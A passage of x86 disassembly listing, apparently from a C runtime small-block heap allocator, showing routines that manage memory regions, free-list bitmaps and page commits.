  426aa9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  426ab1:	mov    eax,ds:0x4639f8
  426ab6:	mov    eax,DWORD PTR [eax+0x10]
  426ab9:	dec    BYTE PTR [eax+0x43]
  426abc:	mov    eax,ds:0x4639f8
  426ac1:	mov    ecx,DWORD PTR [eax+0x10]
  426ac4:	cmp    BYTE PTR [ecx+0x43],0x0
  426ac8:	jne    0x426ad3
  426aca:	and    DWORD PTR [eax+0x4],0xfffffffe
  426ace:	mov    eax,ds:0x4639f8
  426ad3:	cmp    DWORD PTR [eax+0x8],0xffffffff
  426ad7:	jne    0x426b42
  426ad9:	push   ebx
  426ada:	push   0x0
  426adc:	push   DWORD PTR [eax+0xc]
  426adf:	call   esi
  426ae1:	mov    eax,ds:0x4639f8
  426ae6:	push   DWORD PTR [eax+0x10]
  426ae9:	push   0x0
  426aeb:	push   DWORD PTR ds:0x463c40
  426af1:	call   DWORD PTR ds:0x429034
  426af7:	mov    eax,ds:0x4639fc
  426afc:	mov    edx,DWORD PTR ds:0x463a00
  426b02:	lea    eax,[eax+eax*4]
  426b05:	shl    eax,0x2
  426b08:	mov    ecx,eax
  426b0a:	mov    eax,ds:0x4639f8
  426b0f:	sub    ecx,eax
  426b11:	lea    ecx,[ecx+edx*1-0x14]
  426b15:	push   ecx
  426b16:	lea    ecx,[eax+0x14]
  426b19:	push   ecx
  426b1a:	push   eax
  426b1b:	call   0x428370
  426b20:	mov    eax,DWORD PTR [ebp+0x8]
  426b23:	add    esp,0xc
  426b26:	dec    DWORD PTR ds:0x4639fc
  426b2c:	cmp    eax,DWORD PTR ds:0x4639f8
  426b32:	jbe    0x426b38
  426b34:	sub    DWORD PTR [ebp+0x8],0x14
  426b38:	mov    eax,ds:0x463a00
  426b3d:	mov    ds:0x463a08,eax
  426b42:	mov    eax,DWORD PTR [ebp+0x8]
  426b45:	mov    ds:0x4639f8,eax
  426b4a:	mov    DWORD PTR ds:0x463a10,edi
  426b50:	pop    ebx
  426b51:	pop    edi
  426b52:	pop    esi
  426b53:	leave  
  426b54:	ret    
  426b55:	mov    eax,ds:0x4639fc
  426b5a:	mov    ecx,DWORD PTR ds:0x463a0c
  426b60:	push   edi
  426b61:	xor    edi,edi
  426b63:	cmp    eax,ecx
  426b65:	jne    0x426b9b
  426b67:	lea    eax,[ecx+ecx*4+0x50]
  426b6b:	shl    eax,0x2
  426b6e:	push   eax
  426b6f:	push   DWORD PTR ds:0x463a00
  426b75:	push   edi
  426b76:	push   DWORD PTR ds:0x463c40
  426b7c:	call   DWORD PTR ds:0x42910c
  426b82:	cmp    eax,edi
  426b84:	jne    0x426b8a
  426b86:	xor    eax,eax
  426b88:	pop    edi
  426b89:	ret    
  426b8a:	add    DWORD PTR ds:0x463a0c,0x10
  426b91:	mov    ds:0x463a00,eax
  426b96:	mov    eax,ds:0x4639fc
  426b9b:	mov    ecx,DWORD PTR ds:0x463a00
  426ba1:	push   esi
  426ba2:	push   0x41c4
  426ba7:	push   0x8
  426ba9:	push   DWORD PTR ds:0x463c40
  426baf:	lea    eax,[eax+eax*4]
  426bb2:	lea    esi,[ecx+eax*4]
  426bb5:	call   DWORD PTR ds:0x429038
  426bbb:	cmp    eax,edi
  426bbd:	mov    DWORD PTR [esi+0x10],eax
  426bc0:	jne    0x426bc6
  426bc2:	xor    eax,eax
  426bc4:	jmp    0x426c09
  426bc6:	push   0x4
  426bc8:	push   0x2000
  426bcd:	push   0x100000
  426bd2:	push   edi
  426bd3:	call   DWORD PTR ds:0x429058
  426bd9:	cmp    eax,edi
  426bdb:	mov    DWORD PTR [esi+0xc],eax
  426bde:	jne    0x426bf2
  426be0:	push   DWORD PTR [esi+0x10]
  426be3:	push   edi
  426be4:	push   DWORD PTR ds:0x463c40
  426bea:	call   DWORD PTR ds:0x429034
  426bf0:	jmp    0x426bc2
  426bf2:	or     DWORD PTR [esi+0x8],0xffffffff
  426bf6:	mov    DWORD PTR [esi],edi
  426bf8:	mov    DWORD PTR [esi+0x4],edi
  426bfb:	inc    DWORD PTR ds:0x4639fc
  426c01:	mov    eax,DWORD PTR [esi+0x10]
  426c04:	or     DWORD PTR [eax],0xffffffff
  426c07:	mov    eax,esi
  426c09:	pop    esi
  426c0a:	pop    edi
  426c0b:	ret    
  426c0c:	push   ebp
  426c0d:	mov    ebp,esp
  426c0f:	push   ecx
  426c10:	push   ecx
  426c11:	mov    ecx,DWORD PTR [ebp+0x8]
  426c14:	mov    eax,DWORD PTR [ecx+0x8]
  426c17:	push   ebx
  426c18:	push   esi
  426c19:	mov    esi,DWORD PTR [ecx+0x10]
  426c1c:	push   edi
  426c1d:	xor    ebx,ebx
  426c1f:	jmp    0x426c24
  426c21:	shl    eax,1
  426c23:	inc    ebx
  426c24:	test   eax,eax
  426c26:	jge    0x426c21
  426c28:	mov    eax,ebx
  426c2a:	imul   eax,eax,0x204
  426c30:	lea    eax,[eax+esi*1+0x144]
  426c37:	push   0x3f
  426c39:	mov    DWORD PTR [ebp-0x8],eax
  426c3c:	pop    edx
  426c3d:	mov    DWORD PTR [eax+0x8],eax
  426c40:	mov    DWORD PTR [eax+0x4],eax
  426c43:	add    eax,0x8
  426c46:	dec    edx
  426c47:	jne    0x426c3d
  426c49:	push   0x4
  426c4b:	mov    edi,ebx
  426c4d:	push   0x1000
  426c52:	shl    edi,0xf
  426c55:	add    edi,DWORD PTR [ecx+0xc]
  426c58:	push   0x8000
  426c5d:	push   edi
  426c5e:	call   DWORD PTR ds:0x429058
  426c64:	test   eax,eax
  426c66:	jne    0x426c70
  426c68:	or     eax,0xffffffff
  426c6b:	jmp    0x426d0d
  426c70:	lea    edx,[edi+0x7000]
  426c76:	cmp    edi,edx
  426c78:	mov    DWORD PTR [ebp-0x4],edx
  426c7b:	ja     0x426cc0
  426c7d:	mov    ecx,edx
  426c7f:	sub    ecx,edi
  426c81:	shr    ecx,0xc
  426c84:	lea    eax,[edi+0x10]
  426c87:	inc    ecx
  426c88:	or     DWORD PTR [eax-0x8],0xffffffff
  426c8c:	or     DWORD PTR [eax+0xfec],0xffffffff
  426c93:	lea    edx,[eax+0xffc]
  426c99:	mov    DWORD PTR [eax],edx
  426c9b:	lea    edx,[eax-0x1004]
  426ca1:	mov    DWORD PTR [eax-0x4],0xff0
  426ca8:	mov    DWORD PTR [eax+0x4],edx
  426cab:	mov    DWORD PTR [eax+0xfe8],0xff0
  426cb5:	add    eax,0x1000
  426cba:	dec    ecx
  426cbb:	jne    0x426c88
  426cbd:	mov    edx,DWORD PTR [ebp-0x4]
  426cc0:	mov    eax,DWORD PTR [ebp-0x8]
  426cc3:	add    eax,0x1f8
  426cc8:	lea    ecx,[edi+0xc]
  426ccb:	mov    DWORD PTR [eax+0x4],ecx
  426cce:	mov    DWORD PTR [ecx+0x8],eax
  426cd1:	lea    ecx,[edx+0xc]
  426cd4:	mov    DWORD PTR [eax+0x8],ecx
  426cd7:	mov    DWORD PTR [ecx+0x4],eax
  426cda:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  426cdf:	xor    edi,edi
  426ce1:	inc    edi
  426ce2:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  426ce9:	mov    al,BYTE PTR [esi+0x43]
  426cec:	mov    cl,al
  426cee:	inc    cl
  426cf0:	test   al,al
  426cf2:	mov    eax,DWORD PTR [ebp+0x8]
  426cf5:	mov    BYTE PTR [esi+0x43],cl
  426cf8:	jne    0x426cfd
  426cfa:	or     DWORD PTR [eax+0x4],edi
  426cfd:	mov    edx,0x80000000
  426d02:	mov    ecx,ebx
  426d04:	shr    edx,cl
  426d06:	not    edx
  426d08:	and    DWORD PTR [eax+0x8],edx
  426d0b:	mov    eax,ebx
  426d0d:	pop    edi
  426d0e:	pop    esi
  426d0f:	pop    ebx
  426d10:	leave  
  426d11:	ret    
  426d12:	push   ebp
  426d13:	mov    ebp,esp
  426d15:	sub    esp,0xc
  426d18:	mov    ecx,DWORD PTR [ebp+0x8]
  426d1b:	mov    eax,DWORD PTR [ecx+0x10]
  426d1e:	push   ebx
  426d1f:	push   esi
  426d20:	mov    esi,DWORD PTR [ebp+0x10]
  426d23:	push   edi
  426d24:	mov    edi,DWORD PTR [ebp+0xc]
  426d27:	mov    edx,edi
  426d29:	sub    edx,DWORD PTR [ecx+0xc]
  426d2c:	add    esi,0x17
  426d2f:	shr    edx,0xf
  426d32:	mov    ecx,edx
  426d34:	imul   ecx,ecx,0x204
  426d3a:	lea    ecx,[ecx+eax*1+0x144]
  426d41:	mov    DWORD PTR [ebp-0xc],ecx
  426d44:	mov    ecx,DWORD PTR [edi-0x4]
  426d47:	and    esi,0xfffffff0
  426d4a:	dec    ecx
  426d4b:	cmp    esi,ecx
  426d4d:	lea    edi,[ecx+edi*1-0x4]
  426d51:	mov    ebx,DWORD PTR [edi]
  426d53:	mov    DWORD PTR [ebp+0x10],ecx
  426d56:	mov    DWORD PTR [ebp-0x4],ebx
  426d59:	jle    0x426eb4
  426d5f:	test   bl,0x1
  426d62:	jne    0x426ead
  426d68:	add    ebx,ecx
  426d6a:	cmp    esi,ebx
  426d6c:	jg     0x426ead
  426d72:	mov    ecx,DWORD PTR [ebp-0x4]
  426d75:	sar    ecx,0x4
  426d78:	dec    ecx
  426d79:	cmp    ecx,0x3f
  426d7c:	mov    DWORD PTR [ebp-0x8],ecx
  426d7f:	jbe    0x426d87
  426d81:	push   0x3f
  426d83:	pop    ecx
  426d84:	mov    DWORD PTR [ebp-0x8],ecx
  426d87:	mov    ebx,DWORD PTR [edi+0x4]
  426d8a:	cmp    ebx,DWORD PTR [edi+0x8]
  426d8d:	jne    0x426dd2
  426d8f:	cmp    ecx,0x20
  426d92:	mov    ebx,0x80000000
  426d97:	jae    0x426db3
  426d99:	shr    ebx,cl
  426d9b:	mov    ecx,DWORD PTR [ebp-0x8]
  426d9e:	lea    ecx,[ecx+eax*1+0x4]
  426da2:	not    ebx
  426da4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426da8:	dec    BYTE PTR [ecx]
  426daa:	jne    0x426dd2
  426dac:	mov    ecx,DWORD PTR [ebp+0x8]
  426daf:	and    DWORD PTR [ecx],ebx
  426db1:	jmp    0x426dd2
  426db3:	add    ecx,0xffffffe0
  426db6:	shr    ebx,cl
  426db8:	mov    ecx,DWORD PTR [ebp-0x8]
  426dbb:	lea    ecx,[ecx+eax*1+0x4]
  426dbf:	not    ebx
  426dc1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426dc8:	dec    BYTE PTR [ecx]
  426dca:	jne    0x426dd2
  426dcc:	mov    ecx,DWORD PTR [ebp+0x8]
  426dcf:	and    DWORD PTR [ecx+0x4],ebx
  426dd2:	mov    ecx,DWORD PTR [edi+0x8]
  426dd5:	mov    ebx,DWORD PTR [edi+0x4]
  426dd8:	mov    DWORD PTR [ecx+0x4],ebx
  426ddb:	mov    ecx,DWORD PTR [edi+0x4]
  426dde:	mov    edi,DWORD PTR [edi+0x8]
  426de1:	mov    DWORD PTR [ecx+0x8],edi
  426de4:	mov    ecx,DWORD PTR [ebp+0x10]
  426de7:	sub    ecx,esi
  426de9:	add    DWORD PTR [ebp-0x4],ecx
  426dec:	cmp    DWORD PTR [ebp-0x4],0x0
  426df0:	jle    0x426e9b
  426df6:	mov    edi,DWORD PTR [ebp-0x4]
  426df9:	mov    ecx,DWORD PTR [ebp+0xc]
  426dfc:	sar    edi,0x4
  426dff:	dec    edi
  426e00:	cmp    edi,0x3f
  426e03:	lea    ecx,[ecx+esi*1-0x4]
  426e07:	jbe    0x426e0c
  426e09:	push   0x3f
  426e0b:	pop    edi
  426e0c:	mov    ebx,DWORD PTR [ebp-0xc]
  426e0f:	lea    ebx,[ebx+edi*8]
  426e12:	mov    DWORD PTR [ebp+0x10],ebx
  426e15:	mov    ebx,DWORD PTR [ebx+0x4]
  426e18:	mov    DWORD PTR [ecx+0x4],ebx
  426e1b:	mov    ebx,DWORD PTR [ebp+0x10]
  426e1e:	mov    DWORD PTR [ecx+0x8],ebx
  426e21:	mov    DWORD PTR [ebx+0x4],ecx
  426e24:	mov    ebx,DWORD PTR [ecx+0x4]
  426e27:	mov    DWORD PTR [ebx+0x8],ecx
  426e2a:	mov    ebx,DWORD PTR [ecx+0x4]
  426e2d:	cmp    ebx,DWORD PTR [ecx+0x8]
  426e30:	jne    0x426e89
  426e32:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  426e36:	mov    BYTE PTR [ebp+0x13],cl
  426e39:	inc    cl
  426e3b:	cmp    edi,0x20
  426e3e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  426e42:	jae    0x426e60
  426e44:	cmp    BYTE PTR [ebp+0x13],0x0
  426e48:	jne    0x426e58
  426e4a:	mov    ecx,edi
  426e4c:	mov    ebx,0x80000000
  426e51:	shr    ebx,cl
  426e53:	mov    ecx,DWORD PTR [ebp+0x8]
  426e56:	or     DWORD PTR [ecx],ebx
  426e58:	lea    eax,[eax+edx*4+0x44]
  426e5c:	mov    ecx,edi
  426e5e:	jmp    0x426e80
  426e60:	cmp    BYTE PTR [ebp+0x13],0x0
  426e64:	jne    0x426e76
  426e66:	lea    ecx,[edi-0x20]
  426e69:	mov    ebx,0x80000000
  426e6e:	shr    ebx,cl
  426e70:	mov    ecx,DWORD PTR [ebp+0x8]
  426e73:	or     DWORD PTR [ecx+0x4],ebx
  426e76:	lea    eax,[eax+edx*4+0xc4]
  426e7d:	lea    ecx,[edi-0x20]
  426e80:	mov    edx,0x80000000
  426e85:	shr    edx,cl
  426e87:	or     DWORD PTR [eax],edx
  426e89:	mov    edx,DWORD PTR [ebp+0xc]
  426e8c:	mov    ecx,DWORD PTR [ebp-0x4]
  426e8f:	lea    eax,[edx+esi*1-0x4]
  426e93:	mov    DWORD PTR [eax],ecx
  426e95:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  426e99:	jmp    0x426e9e
  426e9b:	mov    edx,DWORD PTR [ebp+0xc]
  426e9e:	lea    eax,[esi+0x1]
  426ea1:	mov    DWORD PTR [edx-0x4],eax
  426ea4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  426ea8:	jmp    0x426fe9
  426ead:	xor    eax,eax
  426eaf:	jmp    0x426fec
  426eb4:	jge    0x426fe9
  426eba:	mov    ebx,DWORD PTR [ebp+0xc]
  426ebd:	sub    DWORD PTR [ebp+0x10],esi
  426ec0:	lea    ecx,[esi+0x1]
  426ec3:	mov    DWORD PTR [ebx-0x4],ecx
  426ec6:	lea    ebx,[ebx+esi*1-0x4]
  426eca:	mov    esi,DWORD PTR [ebp+0x10]
  426ecd:	sar    esi,0x4
  426ed0:	dec    esi
  426ed1:	cmp    esi,0x3f
  426ed4:	mov    DWORD PTR [ebp+0xc],ebx
  426ed7:	mov    DWORD PTR [ebx-0x4],ecx
  426eda:	jbe    0x426edf
  426edc:	push   0x3f
  426ede:	pop    esi
  426edf:	test   BYTE PTR [ebp-0x4],0x1
  426ee3:	jne    0x426f69
  426ee9:	mov    esi,DWORD PTR [ebp-0x4]
  426eec:	sar    esi,0x4
  426eef:	dec    esi
  426ef0:	cmp    esi,0x3f
  426ef3:	jbe    0x426ef8
  426ef5:	push   0x3f
  426ef7:	pop    esi
  426ef8:	mov    ecx,DWORD PTR [edi+0x4]
  426efb:	cmp    ecx,DWORD PTR [edi+0x8]
  426efe:	jne    0x426f42
  426f00:	cmp    esi,0x20
  426f03:	mov    ebx,0x80000000
  426f08:	jae    0x426f23
  426f0a:	mov    ecx,esi
  426f0c:	shr    ebx,cl
  426f0e:	lea    esi,[esi+eax*1+0x4]
  426f12:	not    ebx
  426f14:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426f18:	dec    BYTE PTR [esi]
  426f1a:	jne    0x426f3f
  426f1c:	mov    ecx,DWORD PTR [ebp+0x8]
  426f1f:	and    DWORD PTR [ecx],ebx
  426f21:	jmp    0x426f3f
  426f23:	lea    ecx,[esi-0x20]
  426f26:	shr    ebx,cl
  426f28:	lea    ecx,[esi+eax*1+0x4]
  426f2c:	not    ebx
  426f2e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426f35:	dec    BYTE PTR [ecx]
  426f37:	jne    0x426f3f
  426f39:	mov    ecx,DWORD PTR [ebp+0x8]
  426f3c:	and    DWORD PTR [ecx+0x4],ebx
  426f3f:	mov    ebx,DWORD PTR [ebp+0xc]
  426f42:	mov    ecx,DWORD PTR [edi+0x8]
  426f45:	mov    esi,DWORD PTR [edi+0x4]
  426f48:	mov    DWORD PTR [ecx+0x4],esi
  426f4b:	mov    esi,DWORD PTR [edi+0x8]
  426f4e:	mov    ecx,DWORD PTR [edi+0x4]
  426f51:	mov    DWORD PTR [ecx+0x8],esi
  426f54:	mov    esi,DWORD PTR [ebp+0x10]
  426f57:	add    esi,DWORD PTR [ebp-0x4]
  426f5a:	mov    DWORD PTR [ebp+0x10],esi
  426f5d:	sar    esi,0x4
  426f60:	dec    esi
  426f61:	cmp    esi,0x3f
  426f64:	jbe    0x426f69
  426f66:	push   0x3f
  426f68:	pop    esi
  426f69:	mov    ecx,DWORD PTR [ebp-0xc]
  426f6c:	lea    ecx,[ecx+esi*8]
  426f6f:	mov    edi,DWORD PTR [ecx+0x4]
  426f72:	mov    DWORD PTR [ebx+0x8],ecx
  426f75:	mov    DWORD PTR [ebx+0x4],edi
  426f78:	mov    DWORD PTR [ecx+0x4],ebx
  426f7b:	mov    ecx,DWORD PTR [ebx+0x4]
  426f7e:	mov    DWORD PTR [ecx+0x8],ebx
  426f81:	mov    ecx,DWORD PTR [ebx+0x4]
  426f84:	cmp    ecx,DWORD PTR [ebx+0x8]
  426f87:	jne    0x426fe0
  426f89:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  426f8d:	mov    BYTE PTR [ebp+0xf],cl
  426f90:	inc    cl
  426f92:	cmp    esi,0x20
  426f95:	mov    BYTE PTR [esi+eax*1+0x4],cl
  426f99:	jae    0x426fb7
  426f9b:	cmp    BYTE PTR [ebp+0xf],0x0
  426f9f:	jne    0x426faf
  426fa1:	mov    ecx,esi
  426fa3:	mov    edi,0x80000000
  426fa8:	shr    edi,cl
  426faa:	mov    ecx,DWORD PTR [ebp+0x8]
  426fad:	or     DWORD PTR [ecx],edi
  426faf:	lea    eax,[eax+edx*4+0x44]
  426fb3:	mov    ecx,esi
  426fb5:	jmp    0x426fd7
  426fb7:	cmp    BYTE PTR [ebp+0xf],0x0
  426fbb:	jne    0x426fcd
  426fbd:	lea    ecx,[esi-0x20]
  426fc0:	mov    edi,0x80000000
  426fc5:	shr    edi,cl
  426fc7:	mov    ecx,DWORD PTR [ebp+0x8]
  426fca:	or     DWORD PTR [ecx+0x4],edi
  426fcd:	lea    eax,[eax+edx*4+0xc4]
  426fd4:	lea    ecx,[esi-0x20]
  426fd7:	mov    edx,0x80000000
  426fdc:	shr    edx,cl
  426fde:	or     DWORD PTR [eax],edx
  426fe0:	mov    eax,DWORD PTR [ebp+0x10]
  426fe3:	mov    DWORD PTR [ebx],eax
  426fe5:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  426fe9:	xor    eax,eax
  426feb:	inc    eax
  426fec:	pop    edi
  426fed:	pop    esi
  426fee:	pop    ebx
  426fef:	leave  
  426ff0:	ret    
  426ff1:	push   ebp
  426ff2:	mov    ebp,esp
  426ff4:	sub    esp,0x14
  426ff7:	mov    ecx,DWORD PTR [ebp+0x8]
  426ffa:	mov    eax,ds:0x4639fc
  426fff:	mov    edx,DWORD PTR ds:0x463a00
  427005:	add    ecx,0x17
  427008:	and    ecx,0xfffffff0
  42700b:	push   ebx
  42700c:	mov    DWORD PTR [ebp-0x10],ecx
  42700f:	sar    ecx,0x4
  427012:	push   esi
  427013:	lea    eax,[eax+eax*4]
  427016:	push   edi
  427017:	dec    ecx
  427018:	cmp    ecx,0x20
  42701b:	lea    edi,[edx+eax*4]
  42701e:	mov    DWORD PTR [ebp-0x4],edi
  427021:	jge    0x42702e
  427023:	or     esi,0xffffffff
  427026:	shr    esi,cl
  427028:	or     DWORD PTR [ebp-0x8],0xffffffff
  42702c:	jmp    0x42703b
  42702e:	add    ecx,0xffffffe0
  427031:	or     eax,0xffffffff
  427034:	xor    esi,esi
  427036:	shr    eax,cl
  427038:	mov    DWORD PTR [ebp-0x8],eax
  42703b:	mov    eax,ds:0x463a08
  427040:	mov    ebx,eax
  427042:	mov    DWORD PTR [ebp-0xc],esi
  427045:	cmp    ebx,edi
  427047:	jmp    0x42705d
  427049:	mov    ecx,DWORD PTR [ebx+0x4]
  42704c:	mov    edi,DWORD PTR [ebx]
  42704e:	and    ecx,DWORD PTR [ebp-0x8]
  427051:	and    edi,esi
  427053:	or     ecx,edi
  427055:	jne    0x427062
  427057:	add    ebx,0x14
  42705a:	cmp    ebx,DWORD PTR [ebp-0x4]
  42705d:	mov    DWORD PTR [ebp+0x8],ebx
  427060:	jb     0x427049
  427062:	cmp    ebx,DWORD PTR [ebp-0x4]
  427065:	jne    0x42708b
  427067:	mov    ebx,edx
  427069:	jmp    0x42707c
  42706b:	mov    ecx,DWORD PTR [ebx+0x4]
  42706e:	mov    edi,DWORD PTR [ebx]
  427070:	and    ecx,DWORD PTR [ebp-0x8]
  427073:	and    edi,esi
  427075:	or     ecx,edi
  427077:	jne    0x427083
  427079:	add    ebx,0x14
  42707c:	cmp    ebx,eax
  42707e:	mov    DWORD PTR [ebp+0x8],ebx
  427081:	jb     0x42706b
  427083:	cmp    ebx,eax
  427085:	je     0x42711f
  42708b:	mov    DWORD PTR ds:0x463a08,ebx
  427091:	mov    eax,DWORD PTR [ebx+0x10]
  427094:	mov    edx,DWORD PTR [eax]
  427096:	cmp    edx,0xffffffff
  427099:	mov    DWORD PTR [ebp-0x4],edx
  42709c:	je     0x4270b2
  42709e:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  4270a5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  4270a9:	and    ecx,DWORD PTR [ebp-0x8]
  4270ac:	and    edi,esi
  4270ae:	or     ecx,edi
  4270b0:	jne    0x4270e8
  4270b2:	mov    edx,DWORD PTR [eax+0xc4]
  4270b8:	and    edx,DWORD PTR [ebp-0x8]
  4270bb:	and    DWORD PTR [ebp-0x4],0x0
  4270bf:	lea    ecx,[eax+0x44]
  4270c2:	mov    esi,DWORD PTR [ecx]
  4270c4:	and    esi,DWORD PTR [ebp-0xc]
  4270c7:	or     edx,esi
  4270c9:	mov    esi,DWORD PTR [ebp-0xc]
  4270cc:	jne    0x4270e5
  4270ce:	mov    edx,DWORD PTR [ecx+0x84]
  4270d4:	and    edx,DWORD PTR [ebp-0x8]
  4270d7:	inc    DWORD PTR [ebp-0x4]
  4270da:	add    ecx,0x4
  4270dd:	mov    edi,DWORD PTR [ecx]
  4270df:	and    edi,esi
  4270e1:	or     edx,edi
  4270e3:	je     0x4270ce
  4270e5:	mov    edx,DWORD PTR [ebp-0x4]
  4270e8:	mov    ecx,edx
  4270ea:	imul   ecx,ecx,0x204
  4270f0:	lea    ecx,[ecx+eax*1+0x144]
  4270f7:	mov    DWORD PTR [ebp-0xc],ecx
  4270fa:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  4270fe:	xor    edi,edi
  427100:	and    ecx,esi
  427102:	jne    0x427171
  427104:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42710b:	and    ecx,DWORD PTR [ebp-0x8]
  42710e:	push   0x20
  427110:	pop    edi
  427111:	jmp    0x427171
  427113:	cmp    DWORD PTR [ebx+0x8],0x0
  427117:	jne    0x427124
  427119:	add    ebx,0x14
  42711c:	mov    DWORD PTR [ebp+0x8],ebx
  42711f:	cmp    ebx,DWORD PTR [ebp-0x4]
  427122:	jb     0x427113
  427124:	cmp    ebx,DWORD PTR [ebp-0x4]
  427127:	jne    0x42714f
  427129:	mov    ebx,edx
  42712b:	jmp    0x427136
  42712d:	cmp    DWORD PTR [ebx+0x8],0x0
  427131:	jne    0x42713d
  427133:	add    ebx,0x14
  427136:	cmp    ebx,eax
  427138:	mov    DWORD PTR [ebp+0x8],ebx
  42713b:	jb     0x42712d
  42713d:	cmp    ebx,eax
  42713f:	jne    0x42714f
  427141:	call   0x426b55
  427146:	mov    ebx,eax
  427148:	test   ebx,ebx
  42714a:	mov    DWORD PTR [ebp+0x8],ebx
  42714d:	je     0x427167
  42714f:	push   ebx
  427150:	call   0x426c0c
  427155:	pop    ecx
  427156:	mov    ecx,DWORD PTR [ebx+0x10]
  427159:	mov    DWORD PTR [ecx],eax
  42715b:	mov    eax,DWORD PTR [ebx+0x10]
  42715e:	cmp    DWORD PTR [eax],0xffffffff
  427161:	jne    0x42708b
  427167:	xor    eax,eax
  427169:	jmp    0x4272e8
  42716e:	shl    ecx,1
  427170:	inc    edi
  427171:	test   ecx,ecx
  427173:	jge    0x42716e
  427175:	mov    ecx,DWORD PTR [ebp-0xc]
  427178:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  42717c:	mov    ecx,DWORD PTR [edx]
  42717e:	sub    ecx,DWORD PTR [ebp-0x10]
  427181:	mov    esi,ecx
  427183:	sar    esi,0x4
  427186:	dec    esi
  427187:	cmp    esi,0x3f
  42718a:	mov    DWORD PTR [ebp-0x8],ecx
  42718d:	jle    0x427192
  42718f:	push   0x3f
  427191:	pop    esi
  427192:	cmp    esi,edi
  427194:	je     0x42729b
  42719a:	mov    ecx,DWORD PTR [edx+0x4]
  42719d:	cmp    ecx,DWORD PTR [edx+0x8]
  4271a0:	jne    0x4271fe
  4271a2:	cmp    edi,0x20
  4271a5:	mov    ebx,0x80000000
  4271aa:	jge    0x4271d2
  4271ac:	mov    ecx,edi
  4271ae:	shr    ebx,cl
  4271b0:	mov    ecx,DWORD PTR [ebp-0x4]
  4271b3:	lea    edi,[eax+edi*1+0x4]
  4271b7:	not    ebx
  4271b9:	mov    DWORD PTR [ebp-0x14],ebx
  4271bc:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4271c0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4271c4:	dec    BYTE PTR [edi]
  4271c6:	jne    0x4271fb
  4271c8:	mov    ecx,DWORD PTR [ebp-0x14]
  4271cb:	mov    ebx,DWORD PTR [ebp+0x8]
  4271ce:	and    DWORD PTR [ebx],ecx
  4271d0:	jmp    0x4271fe
  4271d2:	lea    ecx,[edi-0x20]
  4271d5:	shr    ebx,cl
  4271d7:	mov    ecx,DWORD PTR [ebp-0x4]
  4271da:	lea    ecx,[eax+ecx*4+0xc4]
  4271e1:	lea    edi,[eax+edi*1+0x4]
  4271e5:	not    ebx
  4271e7:	and    DWORD PTR [ecx],ebx
  4271e9:	dec    BYTE PTR [edi]
  4271eb:	mov    DWORD PTR [ebp-0x14],ebx
  4271ee:	jne    0x4271fb
  4271f0:	mov    ebx,DWORD PTR [ebp+0x8]
  4271f3:	mov    ecx,DWORD PTR [ebp-0x14]
  4271f6:	and    DWORD PTR [ebx+0x4],ecx
  4271f9:	jmp    0x4271fe
  4271fb:	mov    ebx,DWORD PTR [ebp+0x8]
  4271fe:	cmp    DWORD PTR [ebp-0x8],0x0
  427202:	mov    ecx,DWORD PTR [edx+0x8]
  427205:	mov    edi,DWORD PTR [edx+0x4]
  427208:	mov    DWORD PTR [ecx+0x4],edi
  42720b:	mov    ecx,DWORD PTR [edx+0x4]
  42720e:	mov    edi,DWORD PTR [edx+0x8]
  427211:	mov    DWORD PTR [ecx+0x8],edi
  427214:	je     0x4272a7
  42721a:	mov    ecx,DWORD PTR [ebp-0xc]
  42721d:	lea    ecx,[ecx+esi*8]
  427220:	mov    edi,DWORD PTR [ecx+0x4]
  427223:	mov    DWORD PTR [edx+0x8],ecx
  427226:	mov    DWORD PTR [edx+0x4],edi
  427229:	mov    DWORD PTR [ecx+0x4],edx
  42722c:	mov    ecx,DWORD PTR [edx+0x4]
  42722f:	mov    DWORD PTR [ecx+0x8],edx
  427232:	mov    ecx,DWORD PTR [edx+0x4]
  427235:	cmp    ecx,DWORD PTR [edx+0x8]
  427238:	jne    0x427298
  42723a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42723e:	mov    BYTE PTR [ebp+0xb],cl
  427241:	inc    cl
  427243:	cmp    esi,0x20
  427246:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42724a:	jge    0x42726f
  42724c:	cmp    BYTE PTR [ebp+0xb],0x0
  427250:	jne    0x42725d
  427252:	mov    edi,0x80000000
  427257:	mov    ecx,esi
  427259:	shr    edi,cl
  42725b:	or     DWORD PTR [ebx],edi
  42725d:	mov    ecx,esi
  42725f:	mov    edi,0x80000000
  427264:	shr    edi,cl
  427266:	mov    ecx,DWORD PTR [ebp-0x4]
  427269:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42726d:	jmp    0x427298
  42726f:	cmp    BYTE PTR [ebp+0xb],0x0
  427273:	jne    0x427282
  427275:	lea    ecx,[esi-0x20]
  427278:	mov    edi,0x80000000
  42727d:	shr    edi,cl
  42727f:	or     DWORD PTR [ebx+0x4],edi
  427282:	mov    ecx,DWORD PTR [ebp-0x4]
  427285:	lea    edi,[eax+ecx*4+0xc4]
  42728c:	lea    ecx,[esi-0x20]
  42728f:	mov    esi,0x80000000
  427294:	shr    esi,cl
  427296:	or     DWORD PTR [edi],esi
  427298:	mov    ecx,DWORD PTR [ebp-0x8]
  42729b:	test   ecx,ecx
  42729d:	je     0x4272aa
  42729f:	mov    DWORD PTR [edx],ecx
  4272a1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4272a5:	jmp    0x4272aa
  4272a7:	mov    ecx,DWORD PTR [ebp-0x8]
  4272aa:	mov    esi,DWORD PTR [ebp-0x10]
  4272ad:	add    edx,ecx
